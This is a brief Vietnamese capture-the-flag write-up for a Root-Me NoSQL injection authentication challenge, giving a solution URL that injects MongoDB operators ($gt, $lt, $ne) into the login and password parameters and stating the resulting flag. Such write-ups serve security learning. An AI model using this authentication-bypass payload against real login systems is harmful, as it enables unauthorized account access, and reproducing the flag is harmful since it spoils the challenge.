# NoSQL injection - Authentication

## Đề bài

Link: [http://challenge01.root-me.org/web-serveur/ch38/](http://challenge01.root-me.org/web-serveur/ch38/)

![](sc.png)

![](view-web.png)

## Hướng giải

> http://challenge01.root-me.org/web-serveur/ch38/?login[$gt]=admin&login[$lt]=test&pass[$ne]=1

![](result.png)

Vậy key là: `nosqli_no_secret_4_you`.